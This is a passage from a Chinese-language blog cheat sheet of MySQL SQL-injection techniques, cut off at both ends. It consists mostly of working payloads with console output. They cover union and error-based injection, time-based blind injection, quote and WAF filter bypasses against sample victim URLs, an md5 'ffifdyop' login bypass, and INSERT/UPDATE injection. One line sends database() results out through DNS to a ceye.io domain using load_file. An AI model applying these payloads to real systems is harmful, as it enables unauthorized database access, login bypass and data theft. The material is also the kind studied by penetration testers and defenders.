class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 union select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select passwd from (select 1,2,3 as passwd union select * from users)as twoname;</span><br><span class="line">+------------+</span><br><span class="line">| passwd     |</span><br><span class="line">+------------+</span><br><span class="line">| 3          |</span><br><span class="line">| Dumb       |</span><br><span class="line">| I-kill-you |</span><br><span class="line">| p@ssword   |</span><br><span class="line">| crappy     |</span><br><span class="line">| stupidity  |</span><br><span class="line">+------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="limit下的字段数判断"><a href="#limit下的字段数判断" class="headerlink" title="limit下的字段数判断"></a>limit下的字段数判断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users limit 1,1 into @,@;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br><span class="line">mysql&gt; select * from users limit 1,1 into @,@,@;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>or条件下前后如果都为真则返回所有结果，否则只返回条件为真的一方的值</strong></p><h2 id="BENCHMARK"><a href="#BENCHMARK" class="headerlink" title="BENCHMARK"></a>BENCHMARK</h2><p><strong>BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if(left(version(),1)=5,BENCHMARK(10000000,SHA(&#x27;1&#x27;)),1);</span><br><span class="line">+--------------------------------------------------------+</span><br><span class="line">| if(left(version(),1)=5,BENCHMARK(10000000,SHA(&#x27;1&#x27;)),1) |</span><br><span class="line">+--------------------------------------------------------+</span><br><span class="line">|                                                      0 |</span><br><span class="line">+--------------------------------------------------------+</span><br><span class="line">1 row in set (3.60 sec)</span><br></pre></td></tr></table></figure><h2 id="绕过-过滤"><a href="#绕过-过滤" class="headerlink" title="绕过 \&#39; 过滤"></a>绕过 <code>\&#39; </code>过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hex编码</span><br><span class="line">SELECT password FROM Users WHERE username = 0x61646D696E</span><br><span class="line"></span><br><span class="line">char编码</span><br><span class="line">SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</span><br><span class="line"></span><br><span class="line">%2527</span><br><span class="line">主要绕过magic_quotes_gpc过滤，因为%25解码为%,结合后面的27也就是%27也就是&#x27;，所以成功绕过过滤。</span><br></pre></td></tr></table></figure><h2 id="Mysql字符编码利用"><a href="#Mysql字符编码利用" class="headerlink" title="Mysql字符编码利用"></a>Mysql字符编码利用</h2><p><strong>传入的username&#x3D;admin%c2，php的检测if ($username &#x3D;&#x3D;&#x3D; ‘admin’)自然就可以绕过的，在mysql中可以正常查出username&#x3D;’admin’的结果，原理是Mysql在转换字符集的时候，将不完整的字符给忽略了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">造成这个Trick的根本原因是，Mysql字段的字符集和php mysqli客户端设置的字符集不相同。</span><br><span class="line">set names utf8 的意思是将客户端的字符集设置为utf8</span><br><span class="line"></span><br><span class="line">在默认情况下，mysql字符集为latin1，而执行了set names utf8;以后，character_set_client、</span><br><span class="line">character_set_connection、character_set_results等与客户端相关的配置字符集都变成了utf8，但</span><br><span class="line">character_set_database、character_set_server等服务端相关的字符集还是latin1。</span><br></pre></td></tr></table></figure><p><strong>2008年鸟哥曾在博客中讲解了Mysql字符集：</strong></p><blockquote><ol><li>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</li><li>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集</li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">character_set_client和character_set_connection被设置成了utf8，而内部操作字符集其实也就是username字段的</span><br><span class="line">字符集还是默认的latin1。于是，整个操作就有如下字符串转换过程：</span><br><span class="line"></span><br><span class="line">utf8 --&gt; utf8 --&gt; latin1</span><br><span class="line"></span><br><span class="line">最后执行比较username=&#x27;admin&#x27;的时候，&#x27;admin&#x27;是一个latin1字符串。</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">phithon的文章</a></p><h2 id="md5注入"><a href="#md5注入" class="headerlink" title="md5注入"></a>md5注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM admin WHERE username = admin pass =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure><p><strong>当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为’or’ 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。</strong></p><h2 id="Update-和-Insert注入"><a href="#Update-和-Insert注入" class="headerlink" title="Update 和 Insert注入"></a>Update 和 Insert注入</h2><h3 id="闭合后构造"><a href="#闭合后构造" class="headerlink" title="闭合后构造"></a>闭合后构造</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (17,&#x27;注入点&#x27;, &#x27;bond&#x27;);</span><br></pre></td></tr></table></figure><p><strong>若第一个参数可控，则可以将注入点闭合后，在后面使用不被单引号闭合的select语句，将查询结果插入表中，然后再想办法通过正常途径查看。</strong><br>* 数字相加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (17,&#x27;join&#x27;, &#x27;注入点&#x27;);</span><br></pre></td></tr></table></figure><p><strong>注入点变为了第二个，不能同闭合直接构造。但可以通过把想要获取的数据转换为数字，然后与原字符串相加，获取数字后再还原回来。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (17,&#x27;james&#x27;, &#x27;bond&#x27;|conv(hex(substr(user(),1 + (n-1) * 8, 8* n)),16, 10);</span><br><span class="line"></span><br><span class="line">CONV(N,from_base,to_base)</span><br><span class="line">mysql&gt; select &#x27;sssdasd&#x27;|2;</span><br><span class="line">+-------------+</span><br><span class="line">| &#x27;sssdasd&#x27;|2 |</span><br><span class="line">+-------------+</span><br><span class="line">|           2 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;1sssdasd&#x27;|2;</span><br><span class="line">+--------------+</span><br><span class="line">| &#x27;1sssdasd&#x27;|2 |</span><br><span class="line">+--------------+</span><br><span class="line">|            3 |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="构造错误"><a href="#构造错误" class="headerlink" title="构造错误"></a>构造错误</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table 1 VALUES (‘注入点’);</span><br></pre></td></tr></table></figure><p><strong>对于非SELECT注入，如果成功执行的话会修改数据库数据。实战过程中不但会破坏数据库结构（白帽子挖洞的时候很可能因为这个违法），还容易引起管理员注意。所以在不让SQL语句正常执行的情况下获取数据是最好的方法。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table 1 VALUES (&#x27;&#x27;+  SELECT CASE WHEN @@version LIKE &#x27;5.1.56%&#x27; </span><br><span class="line">THEN SLEEP(5) ELSE &#x27;somevale&#x27; END + &#x27;&#x27;);</span><br></pre></td></tr></table></figure><p><strong>因为返回了多列数据，该insert语句并不会执行，但是内部的select语句和sleep函数会照常执行，也就可以通过写脚本获取数据了。</strong></p><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into users value(null,&#x27;p&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.53~&#x27;</span><br><span class="line">mysql&gt; update users set username=&#x27;test&#x27; where id=1 and extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.53~&#x27;</span><br></pre></td></tr></table></figure><h2 id="DNSLOG注入"><a href="#DNSLOG注入" class="headerlink" title="DNSLOG注入"></a>DNSLOG注入</h2><p>利用unc路径配合load_file()函数可以用来发送dns解析请求，把查询结果放在多级域名中解析，然后能够在dns服务器的解析日志中获取查询结果。<br>- unc路径是windows下的特性，默认安装的linux下不存在这样的功能。<br>- 因为存在dns缓存，请求过一次域名后，会在本机产生dns记录，不会向外递归查询，所以unc路径中DNS域名不能相同。通过在域名中添加随机字符串’rMy’,’Nrz’确保每次查询dns不存在缓存<br>- unc路径长度不能过长，unc路径最大长度为128，可以通过使用substring（）函数每次传输特定位数的数据。<br>- unc路径中不能含有空格等特殊字符，包含的话不会发送dns请求。可以对获得数据进行hex编码</p><p><strong>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</strong><br>dnslog平台：<a href="http://ceye.io/">http://ceye.io/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use security;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; select load_file(&#x27;\\\\test.xxx.ceye.io\\abc&#x27;);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| load_file(&#x27;\\\\test.xxx.ceye.io\\abc&#x27;) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| NULL                                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set (22.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.ceye.io\\abc&#x27;));</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.ceye.io\\abc&#x27;)) |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| NULL                                                                 |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">一些WAF只过滤小写的SQL关键字。</span><br><span class="line">http://victim.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3--</span><br><span class="line"></span><br><span class="line">某些应用程序和WAF使用preg_replace删除所有SQL关键字。</span><br><span class="line">http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--</span><br><span class="line"></span><br><span class="line">大多数CMS和WAF将解码和过滤/绕过应用程序输入，但一些WAF只能解码输入一次 </span><br><span class="line">双编码可以绕过某些滤波器，因为WAF将解码输入一次，然后在应用程序保持时进行滤波解码执行的SQL语句</span><br><span class="line"></span><br><span class="line">使用C语言编写的WAF容易溢出，或者在加载一堆数据时采取不同的行为。提供大量的数据可以让我们的代码执行 </span><br><span class="line"></span><br><span class="line">内联注释（仅限Mysql）</span><br><span class="line">/*!50000SeLeCt*/大于5.0的版本可以执行</span><br><span class="line"></span><br><span class="line">使用~</span><br><span class="line">mysql&gt; select * from user union select 1,2,~3,~4;</span><br><span class="line">+----+----------+----------------------------------+----------------------+</span><br><span class="line">| id | username | passwd                           | role                 |</span><br><span class="line">+----+----------+----------------------------------+----------------------+</span><br><span class="line">|  1 | admin    | 9135967b6c6b40aa49f070360ea99b1f | admin                |</span><br><span class="line">|  1 | 2        | 18446744073709551612             | 18446744073709551611 |</span><br><span class="line">+----+----------+----------------------------------+----------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">使用小数点(.)</span><br><span class="line">mysql&gt; select * from user union select 1,2,.3,.4;</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">| id | username | passwd                           | role  |</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">|  1 | admin    | 9135967b6c6b40aa49f070360ea99b1f | admin |</span><br><span class="line">|  1 | 2        | 0.3                              | 0.4   |</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">使用字符（*9e0）</span><br><span class="line">*9e0和前面的id=1′和起来，后台查询语句可能就变成了select * from user where id=&#x27;1&#x27;*9e0;而在mysql中9e0表示9乘10的0次方，所以mysql会把上面字符串1强制转换成数值1再乘9，语句也就变成了select * from article where id=&#x27;1′</span><br><span class="line">mysql&gt; select * from user where id=&#x27;1&#x27; *9e0 union select 1,2,3,4;</span><br><span class="line">+----+----------+--------+------+</span><br><span class="line">| id | username | passwd | role |</span><br><span class="line">+----+----------+--------+------+</span><br><span class="line">|  1 | 2        | 3      | 4    |</span><br><span class="line">+----+----------+--------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">字符串前如from前加e0</span><br><span class="line">mysql&gt; select * from user where id=1 union select 1,2,3,4e0from user;</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">| id | username | passwd                           | role  |</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">|  1 | admin    | 9135967b6c6b40aa49f070360ea99b1f | admin |</span><br><span class="line">|  1 | 2        | 3                                | 4     |</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="innodb"><a href="#innodb" class="headerlink" title="innodb"></a>innodb</h2><p><strong><code>MySQL 5.7</code>之后的版本，在其自带的 mysql 库中，新增了<code>innodb_table_stats</code> 和<code>innodb_index_stats</code>这两张日志表。如果数据表的引擎是<code>innodb</code> ，则会在这两张表中记录表、键的信息 。</strong><br>如果waf掉了information我们可以利用这两个表注入数据库名和表名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from mysql.innodb_table_stats;</span><br><span class="line">+---------------+---------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| database_name | table_name    | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |</span><br><span class="line">+---------------+---------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| challenges    | ZGRW907ENU    | 2018-05-18 01:55:43 |      0 |                    1 |                        0 |</span><br><span class="line">| dvwa          | guestbook     | 2018-04-21 23:00:47 |      0 |                    1 |                        0 |</span><br><span class="line">| dvwa          | users         | 2018-04-21 23:00:57 |      5 |                    1 |                        0 |</span><br><span class="line">| mysql         | gtid_executed | 2018-04-21 22:47:54 |      0 |                    1 |                        0 |</span><br><span class="line">| security      | emails        | 2018-05-18 01:55:43 |      8 |                    1 |                        0 |</span><br><span class="line">| security      | fish_admin    | 2018-11-27 18:28:51 |      0 |                    1 |                        1 |</span><br><span class="line">| security      | flag          | 2018-09-18 05:16:14 |      0 |                    1 |                        0 |</span><br><span class="line">| security      | referers      | 2018-05-18 01:55:43 |      0 |                    1 |                        0 |</span><br><span class="line">| security      | uagents       | 2018-05-18 01:55:43 |      0 |                    1 |                        0 |</span><br><span class="line">| security      | users         | 2018-05-18 01:55:43 |     13 |                    1 |                        0 |</span><br><span class="line">| sys           | sys_config    | 2018-04-21 22:47:54 |      2 |                    1 |                        0 |</span><br><span class="line">+---------------+---------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">11 rows in set (0.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; mysql&gt; select * from mysql.innodb_index_stats;</span><br><span class="line">+---------------+---------------+------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class="line">| database_name | table_name    | index_name | last_update         | stat_name    | stat_value | sample_size | stat_description                  |</span><br><span class="line">+---------------+---------------+------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class="line">| challenges    | ZGRW907ENU    | PRIMARY    | 2018-05-18 01:55:43 | n_diff_pfx01 |          0 |           1 | sessid                            |</span><br><span class="line">| challenges    | ZGRW907ENU    | PRIMARY    | 2018-05-18 01:55:43 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">| challenges    | ZGRW907ENU    | PRIMARY    | 2018-05-18 01:55:43 | size         |          1 |        NULL | Number of pages in the index      |</span><br><span class="line">| dvwa          | guestbook     | PRIMARY    | 2018-04-21 23:00:47 | n_diff_pfx01 |          0 |           1 | comment_id                        |</span><br><span class="line">| dvwa          | guestbook     | PRIMARY    | 2018-04-21 23:00:47 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">| dvwa          | guestbook     | PRIMARY    | 2018-04-21 23:00:47 | size         |          1 |        NULL | Number of pages in the index      |</span><br><span class="line">| dvwa          | users         | PRIMARY    | 2018-04-21 23:00:57 | n_diff_pfx01 |          5 |           1 | user_id                           |</span><br><span class="line">| dvwa          | users         | PRIMARY    | 2018-04-21 23:00:57 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">| dvwa          | users         | PRIMARY    | 2018-04-21 23:00:57 | size         |          1 |        NULL | Number of pages in the index      |</span><br><span class="line">| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | n_diff_pfx01 |          0 |           1 | source_uuid                       |</span><br><span class="line">| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | n_diff_pfx02 |          0 |           1 | source_uuid,interval_start        |</span><br><span class="line">| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | size         |          1 |        NULL | Number of pages in the index      |</span><br><span class="line">| security      | emails        | PRIMARY    | 2018-05-18 01:55:43 | n_diff_pfx01 |          8 |           1 | id                                |</span><br><span class="line">| security      | emails        | PRIMARY    | 2018-05-18 01:55:43 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">...............</span><br></pre></td></tr></table></figure><h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>MySQL 5.7版中，新加入了<code>sys</code> schema，里面整合了各种资料库资讯<br>其中对我们最有用的资讯大概就是<code>statement_analysis</code>表中的<code>query</code>，里面纪录着我们执行过的SQL语句（normalize过的）和一些数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 8.0.13    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select query from sys.statement_analysis;</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">| query                                                             |</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">| SELECT `cat` . `name` AS `CATA ... s_database` ( `sch` . `name` ) |</span><br><span class="line">| SELECT @@`skip_networking` , @ ... ssl_crlpath` , @@`tls_version` |</span><br><span class="line">| SELECT @@`version_comment` LIMIT ?                                |</span><br><span class="line">| SELECT `version` ( )                                              |</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">4 rows in set (0.03 sec)</span><br></pre></td></tr></table></figure><h2 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT 18446744073709551610 * 2;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;(18446744073709551610 * 2)&#x27;</span><br><span class="line">mysql&gt; SELECT 18446744073709551610 * 1;</span><br><span class="line">+--------------------------+</span><br><span class="line">| 18446744073709551610 * 1 |</span><br><span class="line">+--------------------------+</span><br><span class="line">|     18446744073709551610 |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT updatexml(1,&#x27;@&#x27;,1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;&#x27;</span><br><span class="line">mysql&gt; SELECT updatexml(1,&#x27;1&#x27;,1);</span><br><span class="line">+--------------------+</span><br><span class="line">| updatexml(1,&#x27;1&#x27;,1) |</span><br><span class="line">+--------------------+</span><br><span class="line">| NULL               |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT pow(9999,100);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;pow(9999,100)&#x27;</span><br><span class="line">mysql&gt; SELECT pow(9999,1);</span><br><span class="line">+-------------+</span><br><span class="line">| pow(9999,1) |</span><br><span class="line">+-------------+</span><br><span class="line">|        9999 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT exp((select 1)*18446744073709551615);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp((1 * 18446744073709551615))&#x27;</span><br><span class="line">mysql&gt; SELECT exp((select 0)*18446744073709551615);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| exp((select 0)*18446744073709551615) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    1 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/[https://www.cdxy.me/?p=789%5D(https://www.cdxy.me/?p=789)">MySQL时间盲注五种延时方法</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sleep就不用说了</span><br><span class="line"></span><br><span class="line">BENCHMARK(count,expr) </span><br><span class="line">BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是<span class="number">0</span>。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> benchmark(<span class="number">10000000</span>,sha(<span class="number">1</span>));</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span 